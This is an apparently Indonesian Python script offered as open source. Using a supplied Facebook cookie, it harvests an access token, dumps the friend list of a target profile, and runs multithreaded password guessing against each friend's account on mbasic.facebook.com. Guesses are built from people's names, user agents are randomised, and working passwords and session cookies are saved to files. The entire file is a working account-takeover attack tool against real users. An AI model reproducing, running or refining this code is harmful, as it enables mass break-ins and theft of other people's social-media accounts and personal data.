# OPEN SOURCE
# JANGAN LUPA CANTUM KAN NAMA AUTHOR

import requests, os, re, sys, json, time, datetime,random
from datetime import date 
from concurrent.futures import ThreadPoolExecutor

id,ok,cp,user_agent,loop = [],[],[],[],0

H = "\033[0;92m"
K = "\033[0;93m"
P = "\033[0m"

for x in range(1000):
	rr = random.randint
	redmi = f"Mozilla/5.0 (Linux; Android {str(rr(9,10))}; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(0,200))}.0.{str(rr(500,4000))}.{str(rr(0,200))} Mobile SFB/{str(rr(0,150))}.0.{str(rr(0,5000))}.{str(rr(0,200))} Mobile Safari/537.36"
	memek = (redmi)
	user_agent.append(memek)

def banner():
	print("""                                      
 _|_|_|    _|_|_|    _|    _|  _|_|_|_|_|  _|_|_|_|  
 _|    _|  _|    _|  _|    _|      _|      _|        
 _|_|_|    _|_|_|    _|    _|      _|      _|_|_|    
 _|    _|  _|    _|  _|    _|      _|      _|        
 _|_|_|    _|    _|    _|_|        _|      _|_|_|_|  
""")
	
def masuk_cookie():
	os.system("clear")
	cookie = input(f"\nCookie Facebook : ")
	with requests.Session() as REQ:
		try:
			get_tok = REQ.get('https://business.facebook.com/business_locations',headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
			token = re.search("(EAAG\w+)", get_tok.text).group(1)
			coki = {"cookie":cookie}
			open('cookie.txt','w').write(cookie)
			open('token.txt','w').write(token)
			nama = REQ.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=coki).json()["name"]
			time.sleep(2)
			menu()
		except requests.exceptions.ConnectionError:
			exit(f"\nKoneksi Bermasalah")
		except (KeyError,IOError,AttributeError):
			exit(f"\nCookie Invalid")
			
def menu():
	os.system("clear")
	banner()
	try:
		token = open("token.txt","r").read()
		cookie = {"cookie":open("cookie.txt","r").read()}
		nama = requests.get(f'https://graph.facebook.com/me?access_token={token}', cookies=cookie).json()['name']
	except (IOError,KeyError):
		print(f"\nCookie Invalid")
		time.sleep(2)
		masuk_cookie()
	dump(token,cookie)
	sandi(token,cookie)
	
def dump(token,cookie):
	try:
		user = input(f'\nID Publik : ')
		x = requests.get("https://graph.facebook.com/v13.0/%s?fields=friends.limit(5001)&access_token=%s"%(user,token),cookies=cookie).json()
		for z in x['friends']['data']:
			id.append(z['id'] + '<=>' +z['name'])
	except KeyError:
			print(f"ID Tidak Publik");time.sleep(1);menu()
	
def sandi(token,cookie):
	print(f"Semua ID : {len(id)}")
	print("\n\n")
	with ThreadPoolExecutor(max_workers=30) as boy:
		for user in id:
			try:
				uid,name = user.split("<=>")
				mocii = name.split(" ")
				if len(mocii) == 1:
					pwx = [name, mocii[0]+"123", mocii[0]+"12345"]
				elif len(mocii) == 2:
					pwx = [name, mocii[0]+"12345", mocii[0]+"123"]
				elif len(mocii) == 3:
					pwx = [name, mocii[0]+"123", mocii[0]+"12345"]
				elif len(mocii) == 4:
					pwx = [name, mocii[0]+"12345", mocii[0]+"123"]
				else:
					pwx = "sayang","rahaisa"
				boy.submit(brute,uid,pwx)
			except: pass
	exit("\nSelesai")
	
def brute(uid,pwx):
	global ok,cp,loop 
	sys.stdout.write(f"\r{P}{loop}-{len(id)} RESULTS {H}{len(ok)} {P}CHECK {K}{len(cp)}{P}");sys.stdout.flush()
	try:
		for pw in pwx:
			pw = pw.lower()
			ua = random.choice(user_agent)
			session = requests.Session()
			memek = {
			'Host': 'mbasic.facebook.com',
			'cache-control': 'max-age=0',
			'sec-ch-ua-mobile': '?1',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'accept-language': 'id-ID,en-US;q=0.9'
			}
			petot = session.get('https://mbasic.facebook.com/login.php',headers=memek)
			ngentot = {
			"lsd": re.search('name="lsd" value="(.*?)"', str(petot.text)).group(1),
			"jazoest": re.search('name="jazoest" value="(.*?)"', str(petot.text)).group(1),
			"m_ts": re.search('name="m_ts" value="(.*?)"', str(petot.text)).group(1),
			"li": re.search('name="li" value="(.*?)"', str(petot.text)).group(1),
			"try_number": re.search('name="try_number" value="(.*?)"', str(petot.text)).group(1),
			"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(petot.text)).group(1),
			"email": uid,
			"pass": pw,
			"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(petot.text)).group(1),
			"_fb_noscript": re.search('name="_fb_noscript" value="(.*?)"', str(petot.text)).group(1)
			}
			pentil = {
			"Host": "mbasic.facebook.com",
			"cache-control": "max-age=0",
			"upgrade-insecure-requests": "1",
			"origin": "https://mbasic.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"x-requested-with": "mark.via.gp",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "navigate",
			"sec-fetch-user": "?1",
			"sec-fetch-dest": "document",
			"referer": "https://mbasic.facebook.com/login.php",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,en-US;q=0.9"
			}
			pepek = session.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=9",data=ngentot,headers=pentil)
			if "checkpoint" in session.cookies.get_dict():
				print(f"\r{K}CHECK {uid} - {pw}          {P}")
				wrt = (f"{uid} - {pw}")
				cp.append(wrt)
				open("check.txt","a").write(f"{wrt}\n")
				break 
			elif "c_user" in session.cookies.get_dict():
				cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
				print("\r                            ")
				print(f"\r{H}RESULTS {uid} - {pw} - {cookie}          {P}")
				print("\r              ")
				wrt = (f"{uid} - {pw} - {cookie}")
				ok.append(wrt)
				open("results.txt","a").write(f"{wrt}\n")
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError: 
		time.sleep(15)
		brute(uid,pw)
		
menu()
